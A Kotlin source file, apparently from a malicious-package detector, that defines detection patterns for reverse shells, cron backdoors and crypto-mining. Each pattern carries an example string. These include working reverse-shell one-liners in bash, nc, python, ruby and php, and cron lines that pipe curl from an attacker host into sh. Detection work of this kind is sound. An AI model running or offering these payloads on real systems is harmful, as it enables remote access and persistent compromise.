package io.github.typosquat_pd.entity


val reverseTcpExample1 = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
val reverseTcpExample2 = "nc -e /bin/sh 10.0.0.1 1234"
val reverseTcpExample3 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
val reverseTcpExample4 = "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
val reverseTcpExample5 = "php -r \$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

enum class MaliciousPattern(
    val parts: String,
    val example: String
) {
    ReverseTcp1("bash -i", reverseTcpExample1),
    ReverseTcp2("/dev/tcp/", reverseTcpExample1),
    ReverseTcp3("/bin/sh", reverseTcpExample2),
    ReverseTcp4("/bin/bash", reverseTcpExample2),
    ReverseTcp5("nc -e", reverseTcpExample2),
    ReverseTcp6("import socket", reverseTcpExample3), // Over-detection is likely to occur
    ReverseTcp7("subprocess.call", reverseTcpExample3), // (CommandInject?) Over-detection is likely to occur
    ReverseTcp8("TCPSocket.open", reverseTcpExample4), // Over-detection is likely to occur
    ReverseTcp9("fsockopen", reverseTcpExample5), // (CommandInject?) Over-detection is likely to occur
    ReverseTcp10(".exec(", reverseTcpExample5), // (CommandInject?) Over-detection is likely to occur

    // TODO Add lateralMove patter
    BackDoor1("/etc/crontab", "(crontab -l) \nn10 * * * * curl http://<ATTACKER_IP>/run | sh'"),
    BackDoor2("crontab", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
    BackDoor3("/etc/cron*", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
    BackDoor4("/etc/at*", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
    BackDoor5("/var/spool/cron/crontabs/roo", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),
    BackDoor6("/etc/anacrontab", "10 * * * * curl http://{reverse_shell_ip}/run | sh | crontab -"),

    // TODO add pattern
    //   https://refabr1k.gitbook.io/oscp/
    //   https://0xsp.com/offensive/privilege-escalation-cheatsheet
    //   https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
//    val privilegeEscalation = listOf(
//        "import pty",
//        "stty",
//        "suid3num", // https://github.com/Anon-Exploiter/SUID3NUM
//        "pspy", // https://github.com/DominicBreuker/pspy
//        "TERM=xterm",
//        "SHELL=bash",
//        "TERM=xterm-256color",
//    )

//    val pentestToolNames = listOf<String>(
//        "nmap",
//        "masscan",
//        "ssh",
//        "dnsrecon",
//        "gobuster",

    Mining1("CoinHive", "TODO")
}